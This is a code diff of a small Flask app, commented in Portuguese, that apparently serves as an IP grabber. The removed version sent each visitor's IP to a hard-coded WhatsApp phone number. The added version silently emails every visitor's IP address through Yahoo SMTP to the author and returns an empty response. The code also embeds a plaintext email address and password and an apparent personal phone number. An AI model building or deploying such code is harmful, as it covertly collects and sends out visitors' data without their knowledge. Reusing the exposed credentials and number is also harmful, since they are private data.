@@ -1,20 +1,33 @@
 from flask import Flask, request
-import requests
+import smtplib
 
 app = Flask(__name__)
 
-@app.route('/get-ip', methods=['GET'])
-def get_ip():
-    ip = request.headers.get('X-Real-IP', request.remote_addr)
+@app.route('/')
+def index():
+    ip = request.remote_addr
 
-    # Número de telefone para o qual deseja enviar a mensagem via WhatsApp
-    numero_whatsapp = '5527996395105'
+    # Configuração do servidor de email
+    email_server = 'smtp.mail.yahoo.com'
+    email_port = 465
+    email_sender = 'minadoooo11@yahoo.com'
+    email_password = 'prosopopei4'
+    email_recipient = 'minadoooo11@yahoo.com'
 
-    # Envia o IP para o número no WhatsApp
-    url_whatsapp = f'https://api.whatsapp.com/send?phone={numero_whatsapp}&text=O endereço IP do usuário é: {ip}'
-    response = requests.get(url_whatsapp)
+    # Criação da mensagem
+    subject = 'Endereço IP do Usuário'
+    message = f'O endereço IP do usuário é: {ip}'
+    email_text = f'Subject: {subject}\n\n{message}'
 
-    return ''
+    # Envio do email
+    try:
+        with smtplib.SMTP_SSL(email_server, email_port) as server:
+            server.login(email_sender, email_password)
+            server.sendmail(email_sender, email_recipient, email_text)
+    except Exception as e:
+        return f'Erro ao enviar o email: {str(e)}'
+
+    return '', 204
 
 if __name__ == '__main__':
     app.run()
